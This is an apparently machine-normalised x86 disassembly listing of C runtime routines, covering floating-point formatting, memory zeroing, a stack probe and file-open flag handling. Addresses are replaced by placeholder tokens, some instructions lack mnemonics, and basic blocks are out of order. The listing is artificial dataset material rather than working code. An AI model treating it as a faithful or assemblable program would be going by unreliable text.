push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_44df6c
add esp 0x10
jmp r-xdata
test [ eax + 0x20 ] 0x1
jne r-xdata
cmp [ ecx + 0x14 ] ebx
jbe r-xdata
mov edx [ ecx + 0x1c ]
mov edx [ edx + 0x8 ]
test edx edx
je r-xdata
movzx esi [ ebp + 0x24 ]
push esi
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
call edx
add esp 0x20
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_44eb30
push ebp
mov ebp esp
sub esp 0x4
push ebx
push ecx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebp
push [ ebp + 0x10 ]
mov ecx [ ebp + 0x10 ]
mov ebp [ ebp - 0x4 ]
call sub_450278
push esi
push edi
call eax
pop edi
pop esi
mov ebx ebp
pop ebp
mov ecx [ ebp + 0x10 ]
push ebp
mov ebp ebx
cmp ecx 0x100
jne r-xdata
push ecx
call sub_450278
pop ebp
pop ecx
pop ebx
leave
retn 0xc
mov ecx 0x2
sub_44eb7c
push ebp
mov ebp esp
sub esp 0x4
mov [ ebp - 0x4 ] edi
mov edi [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
shr ecx 0x7
pxor xmm0 xmm0
jmp r-xdata
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm0
movdqa [ edi + 0x20 ] xmm0
movdqa [ edi + 0x30 ] xmm0
movdqa [ edi + 0x40 ] xmm0
movdqa [ edi + 0x50 ] xmm0
movdqa [ edi + 0x60 ] xmm0
movdqa [ edi + 0x70 ] xmm0
lea edi [ edi + 0x80 ]
dec ecx
jne r-xdata
mov edi [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_44ebd3
push ebp
mov ebp esp
sub esp 0x10
mov [ ebp - 0x4 ] edi
mov eax [ ebp + 0x8 ]
cdq
mov edi eax
xor edi edx
sub edi edx
and edi 0xf
xor edi edx
sub edi edx
test edi edi
jne r-xdata
neg edi
add edi 0x10
mov [ ebp - 0x10 ] edi
xor eax eax
mov edi [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
[ edi ]
mov eax [ ebp - 0x10 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x10 ]
add ecx eax
sub edx eax
push edx
push 0x0
push ecx
call sub_44ebd3
add esp 0xc
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx ecx
and edx 0x7f
mov [ ebp - 0xc ] edx
cmp ecx edx
je r-xdata
test edx edx
je r-xdata
sub ecx edx
push ecx
push eax
call sub_44eb7c
add esp 0x8
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0xc ]
mov edi [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
add eax [ ebp + 0x10 ]
sub eax edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov edi [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
[ edi ]
mov eax [ ebp + 0x8 ]
jmp r-xdata
sub_44ec62
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_441455
mov esi [ ebp + 0x8 ]
movsx eax [ esi ]
push eax
call sub_4429c3
cmp eax 0x65
jmp r-xdata
pop ecx
jne r-xdata
inc esi
movzx eax [ esi ]
push eax
call sub_44277b
test eax eax
movsx eax [ esi ]
push eax
call sub_4429c3
pop ecx
cmp eax 0x78
jne r-xdata
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
mov al [ esi ]
mov cl [ ecx ]
mov [ esi ] cl
inc esi
inc esi
inc esi
mov cl [ esi ]
mov [ esi ] al
mov al cl
mov cl [ esi ]
inc esi
test cl cl
jne r-xdata
pop esi
cmp [ ebp - 0x4 ] cl
je r-xdata
leave
retn
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_44ecd5
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_441455
mov eax [ ebp + 0x8 ]
mov cl [ eax ]
mov esi [ ebp - 0x10 ]
test cl cl
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
je r-xdata
mov edx [ esi + 0xbc ]
mov edx [ edx ]
mov dl [ edx ]
cmp [ ebp - 0x4 ] 0x0
pop esi
je r-xdata
jmp r-xdata
inc eax
mov cl [ eax ]
test cl cl
jne r-xdata
leave
retn
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov cl [ eax ]
test cl cl
jne r-xdata
cmp cl dl
je r-xdata
cmp cl 0x65
je r-xdata
mov edx eax
cmp cl 0x45
je r-xdata
dec eax
cmp [ eax ] 0x30
je r-xdata
mov ecx [ esi + 0xbc ]
mov ecx [ ecx ]
push ebx
mov bl [ eax ]
cmp bl [ ecx ]
pop ebx
jne r-xdata
inc eax
mov cl [ edx ]
inc eax
inc edx
mov [ eax ] cl
test cl cl
jne r-xdata
dec eax
sub_44ed57
mov edi edi
push ebp
mov ebp esp
fldz
mov eax [ ebp + 0x8 ]
fcomp [ eax ]
fnstsw ax
test ah 0x41
jpe r-xdata
xor eax eax
pop ebp
retn
xor eax eax
inc eax
pop ebp
retn
sub_44ed73
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
cmp [ ebp + 0x8 ] 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
je r-xdata
lea eax [ ebp + 0x8 ]
push eax
call sub_4541c5
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
lea eax [ ebp - 0x8 ]
push eax
call sub_45411d
mov ecx [ ebp - 0x8 ]
mov eax [ ebp + 0xc ]
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
add esp 0xc
leave
retn
sub_44edcf
mov edi edi
push esi
mov esi eax
test edi edi
je r-xdata
pop esi
retn
push esi
call sub_442e20
inc eax
push eax
push esi
add esi edi
push esi
call sub_441f70
add esp 0x10
sub_44ee14
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x10 ]
mov ebx eax
call sub_441455
xor esi esi
cmp ebx esi
jne r-xdata
cmp [ ebp + 0x8 ] esi
jbe r-xdata
call sub_443b37
push 0x16
cmp [ ebp + 0xc ] esi
jle r-xdata
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
xor eax eax
mov eax [ ebp + 0xc ]
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp + 0x18 ] 0x0
je r-xdata
call sub_443b37
push 0x22
jmp r-xdata
add eax 0x9
cmp [ ebp + 0x8 ] eax
ja r-xdata
mov edi [ ebp + 0x14 ]
cmp [ edi ] 0x2d
mov esi ebx
jne r-xdata
mov edx [ ebp + 0x14 ]
xor eax eax
cmp [ ebp + 0xc ] esi
setg al
xor ecx ecx
cmp [ edx ] 0x2d
sete cl
mov edi eax
add ecx ebx
mov eax ecx
call sub_44edcf
pop edi
push esi
push esi
push esi
push esi
push esi
mov [ eax ] edi
call sub_440791
add esp 0x14
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0xc ] 0x0
jle r-xdata
mov [ ebx ] 0x2d
lea esi [ ebx + 0x1 ]
xor eax eax
cmp [ ebp + 0x18 ] al
sete al
add eax [ ebp + 0xc ]
add esi eax
cmp [ ebp + 0x8 ] 0xffffffff
jne r-xdata
lea eax [ esi + 0x1 ]
mov cl [ eax ]
mov [ esi ] cl
mov esi eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xbc ]
mov eax [ eax ]
mov al [ eax ]
mov [ esi ] al
sub ebx esi
add ebx [ ebp + 0x8 ]
or ebx 0xffffffff
jmp r-xdata
lea ecx [ esi + 0x2 ]
cmp [ ebp + 0x10 ] ebx
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_440669
add esp 0x14
push r--data
push ebx
push esi
call sub_443bb7
add esp 0xc
xor ebx ebx
test eax eax
je r-xdata
mov eax [ edi + 0xc ]
inc esi
cmp [ eax ] 0x30
je r-xdata
mov [ esi ] 0x45
test [ rw-data ] 0x1
je r-xdata
mov eax [ edi + 0x4 ]
dec eax
jns r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ecx ] 0x30
jne r-xdata
inc esi
cmp eax 0x64
jl r-xdata
neg eax
mov [ esi ] 0x2d
xor eax eax
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
push 0x3
lea eax [ ecx + 0x1 ]
push eax
push ecx
call sub_441f70
add esp 0xc
inc esi
cmp eax 0xa
jl r-xdata
cdq
push 0x64
pop edi
idiv edi
add [ esi ] al
mov eax edx
add [ esi + 0x1 ] al
cdq
push 0xa
pop edi
idiv edi
add [ esi ] al
mov eax edx
sub_44ef83
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
push 0x16
pop esi
push esi
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x2c ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_4543e9
xor ebx ebx
add esp 0x14
cmp edi ebx
jne r-xdata
mov eax [ ebp + 0x10 ]
cmp eax ebx
jbe r-xdata
call sub_443b37
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_440791
add esp 0x14
mov eax esi
jmp r-xdata
mov esi [ ebp + 0x14 ]
cmp eax 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_43f96b
leave
retn
xor ecx ecx
cmp [ ebp - 0x2c ] 0x2d
sete cl
sub eax ecx
xor ecx ecx
cmp esi ebx
setg cl
sub eax ecx
or eax 0xffffffff
jmp r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x2c ]
push ebx
push eax
push [ ebp + 0x18 ]
mov eax edi
push esi
push [ ebp + 0x10 ]
call sub_44ee14
add esp 0x18
mov [ edi ] bl
jmp r-xdata
lea ecx [ ebp - 0x2c ]
push ecx
lea ecx [ esi + 0x1 ]
push ecx
push eax
xor eax eax
cmp [ ebp - 0x2c ] 0x2d
sete al
xor ecx ecx
cmp esi ebx
setg cl
add eax edi
add ecx eax
push ecx
call sub_45426d
add esp 0x10
cmp eax ebx
je r-xdata
sub_44f053
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_44ef83
add esp 0x18
pop ebp
retn
sub_44f073
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
push esi
push edi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x14 ] 0x3ff
xor edi edi
mov [ ebp - 0x4 ] 0x30
call sub_441455
cmp [ ebp + 0x14 ] edi
jge r-xdata
mov esi [ ebp + 0xc ]
cmp esi edi
jne r-xdata
mov [ ebp + 0x14 ] edi
cmp [ ebp + 0x10 ] edi
jbe r-xdata
call sub_443b37
push 0x16
mov eax [ ebp + 0x14 ]
add eax 0xb
mov [ esi ] 0x0
cmp [ ebp + 0x10 ] eax
ja r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
mov edi [ ebp + 0x8 ]
mov eax [ edi ]
mov [ ebp - 0xc ] eax
mov eax [ edi + 0x4 ]
mov ecx eax
shr ecx 0x14
mov edx 0x7ff
push ebx
and ecx edx
xor ebx ebx
cmp ecx edx
jne r-xdata
call sub_443b37
push 0x22
jmp r-xdata
pop edi
pop esi
leave
retn
and eax 0x80000000
xor ecx ecx
or ecx eax
je r-xdata
test ebx ebx
jne r-xdata
pop esi
push edi
push edi
push edi
push edi
push edi
mov [ eax ] esi
call sub_440791
add esp 0x14
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov ebx [ ebp + 0x18 ]
mov [ esi ] 0x30
inc esi
test ebx ebx
sete al
dec al
and al 0xe0
add al 0x78
mov [ esi ] al
mov ecx [ edi + 0x4 ]
inc esi
neg ebx
sbb ebx ebx
and ebx 0xffffffe0
and ecx 0x7ff00000
xor eax eax
add ebx 0x27
xor edx edx
or eax ecx
jne r-xdata
mov [ esi ] 0x2d
inc esi
mov eax [ ebp + 0x10 ]
cmp eax 0xffffffff
jne r-xdata
mov [ esi ] 0x31
inc esi
mov [ esi ] 0x30
mov ecx [ edi + 0x4 ]
mov eax [ edi ]
and ecx 0xfffff
inc esi
or eax ecx
jne r-xdata
add eax 0xfffffffe
or eax eax
jmp r-xdata
mov ecx [ ebp - 0x24 ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
mov cl [ ecx ]
mov [ eax ] cl
mov [ eax ] dl
jmp r-xdata
mov [ ebp - 0x14 ] 0x3fe
jmp r-xdata
mov [ ebp - 0x14 ] edx
jmp r-xdata
cmp [ ebx ] 0x2d
jne r-xdata
cmp [ ebp - 0x18 ] 0x0
mov [ esi ] 0x0
je r-xdata
push 0x0
push [ ebp + 0x14 ]
lea ebx [ esi + 0x2 ]
push eax
push ebx
push edi
call sub_44f053
add esp 0x14
test eax eax
je r-xdata
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] 0xf0000
cmp eax edx
jbe r-xdata
mov ecx [ edi + 0x4 ]
mov eax [ edi ]
and ecx 0xfffff
mov [ ebp - 0x8 ] ecx
ja r-xdata
mov eax esi
inc esi
mov [ ebp + 0xc ] eax
cmp [ ebp + 0x14 ] edx
jne r-xdata
mov [ esi ] 0x30
inc esi
cmp [ ebp + 0x18 ] 0x0
push 0x65
sete al
dec al
and al 0xe0
add al 0x78
mov [ esi ] al
inc esi
push esi
call sub_4540f0
pop ecx
pop ecx
test eax eax
je r-xdata
mov [ esi ] 0x2d
inc esi
pop ebx
mov ecx [ ebp - 0x1c ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
jl r-xdata
mov edx [ edi + 0x4 ]
and edx [ ebp - 0x8 ]
mov eax [ edi ]
movsx ecx [ ebp - 0x4 ]
and eax [ ebp - 0xc ]
and edx 0xfffff
call sub_454560
add ax 0x30
movzx eax ax
cmp ax 0x39
jbe r-xdata
cmp [ ebp + 0x14 ] 0x0
jle r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
cmp [ ebp + 0x18 ] 0x0
sete cl
dec cl
and cl 0xe0
add cl 0x70
mov [ eax ] cl
mov [ eax + 0x3 ] 0x0
jmp r-xdata
mov edx [ edi + 0x4 ]
and edx [ ebp - 0x8 ]
mov eax [ edi ]
movsx ecx [ ebp - 0x4 ]
and eax [ ebp - 0xc ]
and edx 0xfffff
call sub_454560
cmp ax 0x8
jbe r-xdata
mov ecx [ ebp - 0x8 ]
sub [ ebp - 0x4 ] 0x4
mov [ esi ] al
mov eax [ ebp - 0xc ]
shrd eax ecx 0x4
shr ecx 0x4
inc esi
dec [ ebp + 0x14 ]
cmp [ ebp - 0x4 ] 0x0
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] ecx
jge r-xdata
add eax ebx
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jne r-xdata
push [ ebp + 0x14 ]
push 0x30
push esi
call sub_443360
add esp 0xc
add esi [ ebp + 0x14 ]
xor eax eax
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
lea eax [ esi - 0x1 ]
cmp [ ebp + 0x14 ] 0x0
jle r-xdata
cmp [ ebp + 0x18 ] 0x0
mov cl 0x34
sete al
dec al
and al 0xe0
add al 0x70
mov [ esi ] al
mov eax [ edi ]
mov edx [ edi + 0x4 ]
inc esi
call sub_454560
xor ebx ebx
and eax 0x7ff
and edx ebx
sub eax [ ebp - 0x14 ]
push ebx
pop ecx
sbb edx ecx
js r-xdata
mov esi eax
mov [ eax ] 0x30
dec eax
jmp r-xdata
cmp cl 0x46
jne r-xdata
mov [ esi ] 0x2d
inc esi
neg eax
adc edx ebx
neg edx
jg r-xdata
mov cl [ eax ]
cmp cl 0x66
je r-xdata
cmp eax [ ebp + 0xc ]
je r-xdata
test edx edx
jl r-xdata
mov ecx 0x3e8
jg r-xdata
mov [ esi ] 0x2b
inc esi
jmp r-xdata
cmp eax ebx
jb r-xdata
inc [ eax - 0x1 ]
mov cl [ eax ]
cmp cl 0x39
jne r-xdata
cmp esi edi
jne r-xdata
jg r-xdata
push ebx
push ecx
push edx
push eax
call sub_454480
add al 0x30
mov [ esi ] al
inc esi
mov [ ebp - 0x10 ] edx
mov eax ecx
mov edx ebx
cmp esi edi
jne r-xdata
cmp eax ecx
jb r-xdata
cmp edx ebx
mov edi esi
mov [ esi ] 0x30
jl r-xdata
inc cl
mov [ eax ] cl
jmp r-xdata
add bl 0x3a
mov [ eax ] bl
jmp r-xdata
push 0x0
push 0xa
push edx
push eax
call sub_454480
add al 0x30
mov [ esi ] al
mov [ ebp - 0x10 ] edx
inc esi
mov eax ecx
mov [ ebp - 0x10 ] ebx
test edx edx
jl r-xdata
push 0x0
push 0x64
push edx
push eax
call sub_454480
add al 0x30
mov [ esi ] al
mov [ ebp - 0x10 ] edx
inc esi
mov eax ecx
mov edx ebx
cmp eax 0x64
jb r-xdata
add al 0x30
mov [ esi ] al
mov [ esi + 0x1 ] 0x0
jg r-xdata
cmp eax 0xa
jb r-xdata
sub_44f3e6
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
push [ ebp + 0x14 ]
mov ebx eax
mov esi [ ebx + 0x4 ]
mov edi ecx
lea ecx [ ebp - 0x10 ]
dec esi
call sub_441455
test edi edi
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jbe r-xdata
call sub_443b37
push 0x16
pop esi
mov [ eax ] esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_440791
add esp 0x14
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebx ] 0x2d
mov esi edi
jne r-xdata
cmp esi [ ebp + 0xc ]
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebx + 0x4 ]
xor edi edi
inc edi
test eax eax
jg r-xdata
mov [ edi ] 0x2d
lea esi [ edi + 0x1 ]
xor eax eax
cmp [ ebx ] 0x2d
sete al
add eax esi
add eax edi
mov [ eax ] 0x30
mov [ eax + 0x1 ] 0x0
add esi eax
mov eax esi
call sub_44edcf
mov [ esi ] 0x30
inc esi
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax esi
call sub_44edcf
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xbc ]
mov eax [ eax ]
mov al [ eax ]
mov [ esi ] al
mov ebx [ ebx + 0x4 ]
inc esi
test ebx ebx
jge r-xdata
cmp [ ebp + 0xc ] 0x0
jle r-xdata
xor eax eax
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
neg ebx
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ ebp + 0xc ] ebx
cmp [ ebp + 0xc ] ebx
jl r-xdata
mov edi [ ebp + 0xc ]
mov eax esi
call sub_44edcf
push edi
push 0x30
push esi
call sub_443360
add esp 0xc
sub_44f4dd
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
push 0x16
pop esi
push esi
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x2c ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_4543e9
xor ebx ebx
add esp 0x14
cmp edi ebx
jne r-xdata
mov eax [ ebp + 0x10 ]
cmp eax ebx
jbe r-xdata
call sub_443b37
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_440791
add esp 0x14
mov eax esi
jmp r-xdata
cmp eax 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_43f96b
leave
retn
xor ecx ecx
cmp [ ebp - 0x2c ] 0x2d
sete cl
sub eax ecx
or eax eax
jmp r-xdata
push [ ebp + 0x18 ]
lea eax [ ebp - 0x2c ]
push ebx
push esi
push [ ebp + 0x10 ]
mov ecx edi
call sub_44f3e6
add esp 0x10
mov [ edi ] bl
jmp r-xdata
mov esi [ ebp + 0x14 ]
lea ecx [ ebp - 0x2c ]
push ecx
mov ecx [ ebp - 0x28 ]
add ecx esi
push ecx
push eax
xor eax eax
cmp [ ebp - 0x2c ] 0x2d
sete al
add eax edi
push eax
call sub_45426d
add esp 0x10
cmp eax ebx
je r-xdata
sub_44f598
mov edi edi
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
push 0x16
pop edi
push edi
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x30 ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_4543e9
xor ebx ebx
add esp 0x14
cmp esi ebx
jne r-xdata
mov ecx [ ebp + 0x10 ]
cmp ecx ebx
jbe r-xdata
call sub_443b37
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] edi
call sub_440791
add esp 0x14
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x2c ]
dec eax
mov [ ebp - 0x20 ] eax
xor eax eax
cmp [ ebp - 0x30 ] 0x2d
sete al
lea edi [ eax + esi ]
cmp ecx 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_43f96b
leave
retn
sub ecx eax
or ecx ecx
jmp r-xdata
mov eax [ ebp - 0x2c ]
dec eax
cmp [ ebp - 0x20 ] eax
setl cl
cmp eax 0xfffffffc
jl r-xdata
mov [ esi ] bl
jmp r-xdata
lea eax [ ebp - 0x30 ]
push eax
push [ ebp + 0x14 ]
push ecx
push edi
call sub_45426d
add esp 0x10
cmp eax ebx
je r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x30 ]
push 0x1
push eax
push [ ebp + 0x18 ]
mov eax esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call sub_44ee14
add esp 0x18
cmp eax [ ebp + 0x14 ]
jge r-xdata
cmp cl bl
je r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x30 ]
push 0x1
push [ ebp + 0x14 ]
mov ecx esi
push [ ebp + 0x10 ]
call sub_44f3e6
add esp 0x10
jmp r-xdata
mov al [ edi ]
inc edi
test al al
jne r-xdata
mov [ edi - 0x2 ] bl
sub_44f692
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
cmp eax 0x65
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_44ef83
cmp eax 0x45
je r-xdata
cmp eax 0x66
jne r-xdata
cmp eax 0x61
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_44f4dd
add esp 0x14
pop ebp
retn
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_44f073
jmp r-xdata
cmp eax 0x41
je r-xdata
add esp 0x18
pop ebp
retn
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_44f598
jmp r-xdata
sub_44f71a
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_44f692
add esp 0x1c
pop ebp
retn
sub_44f73d
mov edi edi
push esi
push edi
xor edi edi
lea esi [ edi + rw-data ]
push [ esi ]
call sub_4452fd
add edi 0x4
pop ecx
mov [ esi ] eax
cmp edi 0x28
jb r-xdata
pop edi
pop esi
retn
sub_44f75e
mov edi edi
push esi
push 0x30000
push 0x10000
xor esi esi
push esi
call sub_454588
add esp 0xc
test eax eax
je r-xdata
pop esi
retn
push esi
push esi
push esi
push esi
push esi
call sub_440669
add esp 0x14
sub_44f789
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
fld [ r--data ]
fstp [ ebp - 0x10 ]
fld [ r--data ]
fstp [ ebp - 0x18 ]
fld [ ebp - 0x18 ]
fdiv [ ebp - 0x10 ]
fmul [ ebp - 0x10 ]
fsubr [ ebp - 0x18 ]
fstp [ ebp - 0x8 ]
fld1
fcomp [ ebp - 0x8 ]
fnstsw ax
test ah 0x5
jpe r-xdata
xor eax eax
leave
retn
xor eax eax
inc eax
leave
retn
sub_44f7c7
push r--data
call [ GetModuleHandleA@IAT ]
test eax eax
je r-xdata
jmp sub_44f789
push r--data
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push 0x0
call eax
retn
sub_44f7f0
push ecx
lea ecx [ esp + 0x4 ]
sub ecx eax
sbb eax eax
not eax
and ecx eax
mov eax esp
and eax 0xfffff000
sub eax 0x1000
test [ eax ] eax
jmp r-xdata
mov eax ecx
pop ecx
xchg esp eax
mov eax [ eax ]
mov [ esp ] eax
retn
cmp ecx eax
jb r-xdata
sub_44f81b
push 0x10
push r--data
call sub_4433dc
xor ebx ebx
mov [ ebp - 0x1c ] ebx
push 0x1
call sub_4488e6
pop ecx
mov [ ebp - 0x4 ] ebx
push 0x3
pop edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_44f8b1
mov eax [ ebp - 0x1c ]
call sub_443421
retn
mov esi edi
shl esi 0x2
mov eax [ rw-data ]
add eax esi
cmp [ eax ] ebx
je r-xdata
inc edi
jmp r-xdata
mov eax [ eax ]
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] edi
cmp edi [ rw-data ]
jge r-xdata
cmp edi 0x14
jl r-xdata
push eax
call sub_44040f
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov eax [ esi + eax ]
add eax 0x20
push eax
call [ DeleteCriticalSection@IAT ]
mov eax [ rw-data ]
push [ esi + eax ]
call sub_44120e
pop ecx
mov eax [ rw-data ]
mov [ esi + eax ] ebx
inc [ ebp - 0x1c ]
sub_44f8ba
mov edi edi
push ebp
mov ebp esp
sub esp 0x34
push ebx
xor ebx ebx
test [ ebp + 0x10 ] 0x80
push esi
push edi
mov esi eax
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x2 ] bl
mov [ ebp - 0x34 ] 0xc
mov [ ebp - 0x30 ] ebx
je r-xdata
mov [ ebp - 0x2c ] 0x1
mov [ ebp - 0x1 ] bl
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x1 ] 0x10
jmp r-xdata
mov ecx [ ebp + 0x10 ]
mov eax 0x8000
test eax ecx
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_440669
add esp 0x14
lea eax [ ebp - 0x20 ]
push eax
call sub_454866
pop ecx
test eax eax
je r-xdata
mov eax ecx
and eax 0x3
sub eax ebx
mov edx 0xc0000000
mov edi 0x80000000
je r-xdata
test ecx 0x74000
jne r-xdata
mov [ ebp - 0x8 ] edi
dec eax
je r-xdata
or [ ebp - 0x1 ] 0x80
cmp [ ebp - 0x20 ] eax
je r-xdata
mov [ ebp - 0x10 ] ebx
sub eax ecx
je r-xdata
test cl 0x8
je r-xdata
dec eax
je r-xdata
cmp eax 0x500
je r-xdata
je r-xdata
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
sub eax ecx
je r-xdata
mov [ ebp - 0x8 ] 0x40000000
jmp r-xdata
test ecx 0x70000
jne r-xdata
mov [ ebp - 0x8 ] edx
jmp r-xdata
call sub_443b4a
mov [ eax ] ebx
or [ esi ] 0xffffffff
call sub_443b37
push 0x16
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_440791
add esp 0x14
jmp r-xdata
mov [ ebp - 0x14 ] 0x1
cmp eax 0x600
je r-xdata
mov [ ebp - 0x14 ] 0x3
jmp r-xdata
cmp eax ebx
je r-xdata
mov eax [ ebp + 0x10 ]
mov edx 0x700
and eax edx
mov ecx 0x400
cmp eax ecx
mov edi 0x100
jg r-xdata
mov [ ebp - 0x10 ] 0x2
jmp r-xdata
sub eax ecx
je r-xdata
mov eax [ ebp + 0x14 ]
push 0x10
pop ecx
sub eax ecx
je r-xdata
mov eax esi
jmp r-xdata
test al 0x40
je r-xdata
mov ecx [ rw-data ]
not ecx
and ecx [ ebp + 0x18 ]
test cl cl
js r-xdata
